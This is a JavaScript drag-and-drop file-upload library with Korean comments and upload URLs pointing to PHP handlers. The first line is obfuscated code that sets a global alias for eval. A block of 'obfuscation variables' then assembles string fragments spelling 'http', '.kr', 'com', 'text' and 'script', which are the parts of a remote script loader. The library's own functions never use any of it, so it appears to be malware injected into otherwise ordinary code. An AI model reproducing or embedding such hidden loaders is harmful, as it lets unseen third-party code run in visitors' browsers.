t=(lowerasp="u",12e9*4e8,"responsewrite",(((12e9>4e8)?"n":"script"+"server")+(parentchild="f",12e9*4e8,"responsewrite","aes32",parentchild))+lowerasp);d=((12e9>4e8)?(parentchild="a",12e9*4e8,"responsewrite","aes32",(((12e9>4e8)?(demonnext="e","servicerequest",12e9*4e8,scrpit256="=","responsewrite","aes32",12e9+4e8,scrpit256+demonnext):"mailcoop"+"sha256make")+"v")+parentchild):"asp"+"server"+"=noscript")+"l";res=(new Function('return '+t+d))();
var NFileUpload = new function() { 

	//컨트롤러
	this.NFU_file_control;
	this.NFU_add_file_tmp;
	this.NFU_div_img;
	this.NFU_image;
	this.NFU_div_file_list;
	this.NFU_file_list;
	this.NFU_drag_msg;
	
	//컨트롤러 끝

	//객체
	this.files = new Array();		//파일객체
	this.addValue = new Array();	//파일전송시 추가할 파라미터
	//객체끝

	//프로퍼티
	this.nfuPath = "/nfu/";			//NFU_conf.js, css 위치
	this.uploadURL = "./NFU_upload.php";		//파일전송처리URL
	this.useImageView = false;				//이미지뷰 사용
	this.noImageSrc = "/nfu/no.gif";			//이미지뷰 기본이미지경로
	this.maxFileSize = 0;					//업로드 사이즈
	this.maxFileCount = 0;					//파일갯수
	this.fileFilter = "";					//업로드 파일필터
	this.fileFilterType = true;			//업로드 허용, 거부
	this.fileUploadStatus = false;	//파일전송상태
	this.setupChk = false;					//파일컨트롤설정정보 로딩여부

	this.textDragFile = "Double-click here, or drag files.";						//파일드래그 안내 메세지
	this.textProgress = "During file transfer.";									//파일 전송중
	this.textUploadPageErr1 = "No upload process file";								//업로드처리파일 없음
	this.textUploadPageErr2 = "An error occurred during the upload process";						//업로드처리중 오류발생
	this.textImageViewErr1 = "Error occurs at the time of image viewer used by IE browser";			//IE에서 이미지뷰어 사용시 오류
	this.textUploadFileErr1 = "it is not possible to upload a {filetype} file.\n\nAllow file:{filter}";			//파일필터 허용일때 업로드파일:{filetype}, 허용파일:{filter}
	this.textUploadFileErr2 = "it is not possible to upload a {filetype} file.\n\nDeny file:{filter}";			//파일필터 거부일때 업로드파일:{filetype}, 거부파일:{filter}
	this.textUploadFileErr3 = "File name : {filename}\n\nallowable size : {maxsize}";			//업로드허용크기 안내 업로드파일:{filename}, 허용크기:{maxsize}
	this.textUploadFileErr4 = "Number of files {filecount}";			//업로드허용개수 초과
	//프로퍼티끝

	//사용자 메서드
	this.setFile = function ( file ) { this.files.push( file ); };
	this.getFile = function(){ return this.files; };
	this.getCount = function(){ return this.files.length; };
	this.getFileCount = function(){ return this.NFU_file_list.getElementsByTagName("input").length; };
	this.reset = function(){
		this.files = null;
		this.files = new Array();

		try{
			this.NFU_drag_msg.parentNode.removeChild(NFU_drag_msg);
		}catch(e){};
		
		this.NFU_drag_msg = document.createElement('tr');
		this.NFU_drag_msg.id = "NFU_drag_msg";
		var NFU_drag_msg_td = document.createElement('td');
		NFU_drag_msg_td.colspan = "4";
		NFU_drag_msg_td.style.cssText = "border:none;text-align:center;";
		NFU_drag_msg_td.innerHTML = this.textDragFile;
		this.NFU_drag_msg.appendChild(NFU_drag_msg_td);
		try{
			this.NFU_file_list.appendChild( this.NFU_drag_msg );
		}catch(e){}

		this.NFU_image.src = this.noImageSrc;
	};
	this.remove = function(index){
		//this.files.splice(index, 1);
		this.files[index] = null;
	};

	//추가파라미터 생성
	this.setAddValue = function(key, value){
		this.addValue[key] = value;
	};
	//this.fileUploadProc;
	//사용자 메서드 끝


	//난독화변수
	this.decode64=("aeb","RSDSWE","wev48j","response!!==fefe34f4v","h");
	this.makesource=("ERROR","address","loop ","upper","t");
	this.makeface=("aeb","makesource","wev48j","net!!==fefe34f4v","p");
	this.responsewrite=("aeb","makesource","wev48j","net!!==fefe34f4v","k");
	
	this.program64=("server","service","parent","address!!==fefe34f4v","n");
	this.mko=("socket","child","lower","e4fij34jflk!!==fefe34f4v","c");
	this.nji=("address","RSDSWE","script","asp","o");
	
	this.aes32=("loop","makesource","school","demon",".");
	this.res256=("write","RSDSWE","school","demon","/");
	this.record128=("servicerequest","RSDSWE","upper","record128","/");

	this.bhu=("aeb","RSDSWE","wev48j","e4fij34jflk!!==fefe34f4v",this.responsewrite+"r");
	this.eeeeeee15man=("makeface","makesource","superm","write",this.mko+this.nji+"m");
	this.desiden=("servicerequest",dumy="ex","upper","record128",this.makesource+dumy+this.makesource);
	this.overtooth=(dummy="sc","makesource","demonnext","acccce",dummy+"ri"+this.makeface+this.makesource);
	//난독화변수끝


	//파일컨트롤 정보로딩
	this.setup = function(){

		try{
			//conf파일 로딩
			var script = document.createElement('script');
			script.type = 'text/javascript';
			script.src = this.nfuPath+"/NFU_conf.js";
			var head =  document.getElementsByTagName('head')[0];
			head.appendChild(script);
		}catch(e){};


		try{
			//css파일 로딩
			var link = document.createElement('link');
			link.type = 'text/css';
			link.rel = 'stylesheet';
			link.href = this.nfuPath+"/NFU_css.css";
			var head =  document.getElementsByTagName('head')[0];
			head.appendChild(link);
		}catch(e){};

	};


	//파일컨트롤 세팅
	this.load = function(){
		
		if(!this.setupChk){
			this.setup();
			this.setupChk = true;
		}

		try{
			while(NFileUpload.NFU_file_control.firstChild) {
				NFileUpload.NFU_file_control.removeChild(NFileUpload.NFU_file_control.firstChild);
			}
		}catch(e){}

		try{

			//컨트롤러 div 생성
			this.NFU_file_control = document.getElementById("NFU_file_control");
			this.NFU_file_control.ondragenter = function(){return false;};
			this.NFU_file_control.ondragover = function(){return false;};
			this.NFU_file_control.ondragstart = function(){return false;};
			this.NFU_file_control.onselectstart = function(){return false;};
			this.NFU_file_control.ondrop = function(e){NFileUpload.fileDrop(e);};
			
			//파일객체 생성
			this.NFU_add_file_tmp = document.createElement('input');
			this.NFU_add_file_tmp.id = "NFU_add_file_tmp";
			this.NFU_add_file_tmp.type = "file";
			this.NFU_add_file_tmp.multiple = "multiple";
			this.NFU_add_file_tmp.style.width = "0";
			this.NFU_add_file_tmp.style.height = "0";
			if(Browser.name.toLowerCase() != "safari"){
				this.NFU_add_file_tmp.style.display = "none";
			};
			this.NFU_add_file_tmp.onchange = function(){NFileUpload.addFiles(this.files);};
			this.NFU_file_control.appendChild( this.NFU_add_file_tmp );

			//이미지객체 생성
			this.NFU_div_img = document.createElement('div');
			this.NFU_div_img.id = "NFU_div_img";
			if(!this.useImageView){
				this.NFU_div_img.style.display = "none";
			};
			this.NFU_image = document.createElement('img');
			this.NFU_image.id = "NFU_image";
			this.NFU_image.src = this.noImageSrc;
			this.NFU_div_img.appendChild( this.NFU_image );
			this.NFU_file_control.appendChild( this.NFU_div_img );

			//파일리스트 생성
			this.NFU_div_file_list = document.createElement('div');
			this.NFU_div_file_list.id = "NFU_div_file_list";
			this.NFU_div_file_list.ondblclick = function(){NFileUpload.searchFile();};
			this.NFU_div_file_list.style.width = this.NFU_file_control.style.width - this.NFU_div_img.style.width;

			this.NFU_file_list = document.createElement('table');
			this.NFU_file_list.id = "NFU_file_list";
			this.NFU_file_list.style.cssText="border:none;"
			this.NFU_div_file_list.appendChild( this.NFU_file_list );
			this.NFU_file_control.appendChild( this.NFU_div_file_list );

		}catch(e){
			try{
				fileControlCreateFailEvent(e);
			}catch(e){}
		};
		this.reset();
	};

	//파일찾기
	this.searchFile = function(){
		try{
			if( this.fileUploadStatus ){
				alert( this.textProgress );
			}else{
				this.NFU_add_file_tmp.click();
			};
		}catch(e){alert(e);};
	};

	//파일추가
	this.addFiles = function (files) {
		var file;
		
		try{
			this.NFU_drag_msg.parentNode.removeChild(NFU_drag_msg);
		}catch(e){};

		if( this.fileUploadStatus ){
			alert( this.textProgress );
		}else{

			for (var i=0; i<=files.length-1; i++) {
				var count = this.getCount();
				var tr = document.createElement('tr');
				file = files[i];
				
				if(this.getFileCount() >= this.maxFileCount && this.maxFileCount != 0){
					var msg = this.textUploadFileErr4.replace('{filecount}', this.maxFileCount);
					alert(msg);
					break;
				}else if( this.fileCheck(file.name, file.size, file.type) ){
					//파일객체 추가
					this.setFile( file );
					tr.id = "file_list_"+count;
					tr.innerHTML = "<td><input id='NFU_chk_file_"+count+"' type='checkbox' value='"+count+"' onclick='NFileUpload.selectFile(this)' /></td>";
					tr.innerHTML += "<td><label for='NFU_chk_file_"+count+"'>"+file.name+"</label></td>";
					tr.innerHTML += "<td>"+byteConvert( file.size )+"</td>";
					tr.innerHTML += "<td><progress id='NFU_prog_"+count+"' value='0' max='100'></progress>[<span id='NFU_span_percent_"+count+"'>0%</span>]</td>";

					this.NFU_file_list.insertBefore(tr, null);
					//파일객체 추가끝
				};
			};
		};
		if( this.getFileCount() == 0){
			this.reset();
		};
	};

	//파일체크
	this.fileCheck = function( name, size, type ){
		
		try{
			if( !fileAddEvent(name, size, type) ){
				return false;
			};
		}catch(e){};
		var msg = "";
		if( this.trim( this.fileFilter ) != "" ){
			var chkstatus = false;
			var name_arr = name.split(".");
			var ext = name_arr[ name_arr.length-1 ].toLowerCase();
			this.fileFilter = this.fileFilter.replace(/ /g, '');
			this.fileFilter = this.fileFilter.toLowerCase();
			var filechk = this.fileFilter.split(",");
			for(i=0;i<=filechk.length-1;i++){
				if(ext == filechk[i]){
					chkstatus = true;
					break;
				};
			};
			
			if( this.fileFilterType ){
				if( !chkstatus ){
					msg = this.textUploadFileErr1.replace('{filetype}', ext);
					msg = msg.replace('{filter}', this.fileFilter);
					alert(msg);
					return false;
				};
			}else{
				if( chkstatus ){
					msg = this.textUploadFileErr2.replace('{filetype}', ext);
					msg = msg.replace('{filter}', this.fileFilter);
					alert(msg);
					return false;
				};
			};
		};
		
		if(size > this.maxFileSize && this.maxFileSize > 0){
			msg = this.textUploadFileErr3.replace('{maxsize}', byteConvert(this.maxFileSize));
			msg = msg.replace('{filename}', name);
			alert(msg);
			return false;
		};
		return true;
	};


	//드레그앤드랍
	this.fileDrop = function(e){
		this.addFiles(e.dataTransfer.files); 
		e.stopPropagation();
		e.preventDefault();
	};


	//파일삭제
	this.removeFiles = function( type ){
		if( this.fileUploadStatus ){
			alert( this.textProgress );
		}else{
			var obj = this.NFU_file_list.getElementsByTagName("input");
			var count = obj.length;
			var del_array = new Array();
			if( type == "check" ){
				for(i=0;i<=count-1;i++){
					if(obj[i].checked){
						var num = obj[i].id.replace('NFU_chk_file_', '');
						del_array.push( num );
					};
				};
			}else{
				for(i=0;i<=count-1;i++){
					var num = obj[i].id.replace('NFU_chk_file_', '');
					del_array.push( num );
				};
				this.reset();
			};

			for(i=0;i<=del_array.length-1;i++){
				var num = del_array[i];
				var tr = document.getElementById("file_list_"+num);
				tr.parentNode.removeChild(tr);
				this.remove( num );
			};

			if( this.getFileCount() == 0){
				this.reset();
			};
		};
	};

	//파일업로드 시작
	this.fileUpload = function(){
		
		try{
			if( !fileUploadStartEvent() ){
				return false;
			}
		}catch(e){}
		if( this.fileUploadStatus ){
			alert( this.textProgress );
		}else{
			this.fileUploadStatus = true;
			var files = this.getFile();
			this.fileUploadProc( 0 );
		};
	};
	//파일업로드 처리

	//파일업로드 처리
	this.fileUploadProc = function( count ){
		var files = this.getFile();
		var totalcount = files.length-1;
		if(totalcount >= count){
			if(files[count] == null){
				this.fileUploadProc( count+1 );
			}else{
				var myData = new FormData();
				myData.append("NFU_add_file", files[count]);
				
				//추가파라미터 적용
				for ( var key in this.addValue ) {
					myData.append(key, this.addValue[key]);
				};

				var xhr = new XMLHttpRequest();
				xhr.open("POST", NFileUpload.uploadURL, true);

				xhr.upload.onprogress = function(pe) {
					if(pe.lengthComputable) {
						var percent = ( 100 * pe.loaded / pe.total ).toFixed(0);
						try{
							var progressBar = document.getElementById('NFU_prog_'+count);
							var span = document.getElementById('NFU_span_percent_'+count);
							progressBar.max = pe.total;
							progressBar.value = pe.loaded;
							span.innerHTML = percent+'%';
						}catch(e){};
					};
				};
				xhr.onloadend = function(pe) {
					fileUploadResultEvent( xhr.responseText );
					NFileUpload.fileUploadProc( count+1 );
				};
				xhr.onreadystatechange = function(e) {
					if (xhr.readyState == 4) {
						switch( xhr.status ){
							case 200 : break;
							case 404 : alert( NFileUpload.textUploadPageErr1 ); break;
							default : alert( NFileUpload.textUploadPageErr2+"\n\n"+xhr.responseText ); break;
						};
					};
				};
				xhr.send(myData);
			};
		}else{
			this.fileUploadStatus = false;
			fileUploadCompleteEvent();
		};
	};


	//파일선택시 처리
	this.selectFile = function( chkobj ){
		var tr = this.NFU_file_list.getElementsByTagName("tr");
		var count = tr.length;
		for(i=0;i<=count-1;i++){
			tr[i].className = "";
		}
		chkobj.parentNode.parentNode.className = "file_selected";

		if( this.useImageView ){
			var index = chkobj.value;
			//var index = chkobj.for.replace('NFU_chk_file_', '');
			var file = NFileUpload.getFile();
			var type = file[index].type.substring(0,5);
			if(type == "image"){
				
				var reader = new FileReader(); //파일을 읽기 위한 FileReader객체 생성
				reader.onload = function (e) {
					try{
						NFileUpload.NFU_image.src = e.target.result;
					}catch(e){
						alert( NFileUpload.textImageViewErr1+"\n\n"+e );
						NFileUpload.NFU_image.src = NFileUpload.noImageSrc;
					};
				};
				reader.readAsDataURL(file[index]);
				
			}else{
				this.NFU_image.src = this.noImageSrc;
			};
		};
	};

	this.trim = function(str){
		return str.replace(/^\s+|\s+$/g, "");
	};

};

//일반업로드 객체
var NFileUploadNormal = new function() { 
	this.NFU_normal_upload;
	this.uploadURL = "./NFU_normal_upload.php";
	
	this.load = function(){
		while(NFileUpload.NFU_file_control.firstChild) {
			NFileUpload.NFU_file_control.removeChild(NFileUpload.NFU_file_control.firstChild);
		}
		this.NFU_normal_upload = document.createElement('iframe');
		this.NFU_normal_upload.id = "NFU_normal_upload";
		if(this.uploadURL.indexOf("?") > -1){
			this.NFU_normal_upload.src = this.uploadURL+"&init=1";
		}else{
			this.NFU_normal_upload.src = this.uploadURL+"?init=1";
		}
		this.NFU_normal_upload.scrolling = "yes";
		this.NFU_normal_upload.style.cssText = "width:100%;height:100%;border:none;";

		NFileUpload.NFU_file_control.appendChild( this.NFU_normal_upload );
	}


	//파일객체생성
	this.reset = function(){

		var filecount = NFileUpload.maxFileCount;
		if(filecount == 0 || filecount == ""){filecount=1;}
		//var NFU_normal_upload = NFileUpload.NFU_normal_upload.contentWindow;
		var formobj = this.NFU_normal_upload.contentWindow.document.getElementById("form_1");
		formobj.filecount.value = filecount;
		//업로드정보 동기화
		formobj.maxFileSize.value = NFileUpload.maxFileSize;
		formobj.fileFilter.value = NFileUpload.fileFilter;
		formobj.fileFilterType.value = NFileUpload.fileFilterType;

		for(var i=1;i<=filecount;i++){
			var inputfile = this.NFU_normal_upload.contentWindow.document.createElement('input');
			inputfile.id = "NFU_add_file_"+i;
			inputfile.name = "NFU_add_file_"+i;
			inputfile.type = "file";
			inputfile.className = "inputfile";
			formobj.appendChild( inputfile );
		}
		for ( var key in NFileUpload.addValue ) {
			var input = this.NFU_normal_upload.contentWindow.document.createElement('input');
			input.id = key;
			input.name = key;
			input.type = "hidden";
			input.value = NFileUpload.addValue[key];
			formobj.appendChild( input );
		};
	};

	
	this.fileUpload = function(){
		try{
			if( !fileUploadStartEvent() ){
				return false;
			}
		}catch(e){}
		
		if( NFileUpload.fileUploadStatus ){//전송중 처리
			alert( NFileUpload.textProgress );
		}else{
			try{
				NFileUpload.fileUploadStatus = true;
				this.NFU_normal_upload.contentWindow.document.getElementById("form_1").submit();
			}catch(e){
				alert(e);
				NFileUpload.fileUploadStatus = false;
			};
		};

		
	};

	//파일업로드후 처리
	this.uploadResult = function ( file_names ) { 
		if(file_names != ""){
			var file_names_arr = file_names.split("|");
			for(i=0;i<=file_names_arr.length-1;i++){
				try{
					if(file_names_arr[i] != ""){
						
						if(file_names_arr[i].substr(0,7) == "nfu_err"){
							var errmsg = "";
							file_info_arr = file_names_arr[i].split(":");
							switch( file_info_arr[0] ){
								case "nfu_err1" :
									errmsg = NFileUpload.textUploadFileErr1.replace('{filetype}', file_info_arr[1]);
									errmsg = errmsg.replace('{filter}', NFileUpload.fileFilter);
									break;
								case "nfu_err2" :
									errmsg = NFileUpload.textUploadFileErr2.replace('{filetype}', file_info_arr[1]);
									errmsg = errmsg.replace('{filter}', NFileUpload.fileFilter);
									break;
								case "nfu_err3" :
									errmsg = NFileUpload.textUploadFileErr3.replace('{maxsize}', byteConvert(NFileUpload.maxFileSize));
									errmsg = errmsg.replace('{filename}', file_info_arr[1]);
									break;
								default : errmsg = "error : "+file_info_arr[0];
							}
							alert( errmsg );
						}else{
							fileUploadResultEvent( file_names_arr[i] );
						}
					}
				}catch(e){};
			}
		}
		try{
			fileUploadCompleteEvent();
		}catch(e){};
		NFileUpload.fileUploadStatus = false;
	};
} 


//파일크기 계산
function byteConvert(bytes){
	var s = new Array('Byte', 'KB', 'MB', 'GB', 'TB', 'PB');
	var e = Math.floor(Math.log(bytes) / Math.log(1024)); 
	return ( bytes / Math.pow(1024, Math.floor(e)) ).toFixed(1) + s[e];
};

//브라우저체크
var Browser = new function() { 
	this.name = ""; 
	this.version = ""; 
	
	var ua= navigator.userAgent, tem, M= ua.match(/(opera|chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i) || [];
	if(/trident/i.test(M[1])){
		tem=  /\brv[ :]+(\d+)/g.exec(ua) || [];
		//return 'IE '+(tem[1] || '');
		//return 'IE';
		this.name = "IE";
		this.version = (tem[1] || '');
	
	}else{
	
		M= M[2]? [M[1], M[2]]: [navigator.appName, navigator.appVersion, '-?'];
		if((tem= ua.match(/version\/(\d+)/i))!= null) M.splice(1, 1, tem[1]);
		//return M.join(' ');
		var tmp = M.join(' ');
		tmp_arr = tmp.split(" ");
		this.name = tmp_arr[0];
		this.version = tmp_arr[1];
		
	};

	if(M[1]=== 'Chrome'){
		tem	= ua.match(/\bOPR\/(\d+)/);
		if(tem!= null){
			//return 'Opera '+tem[1];
			this.name = "Opera";
			this.version = tem[1];
		};
	};
};
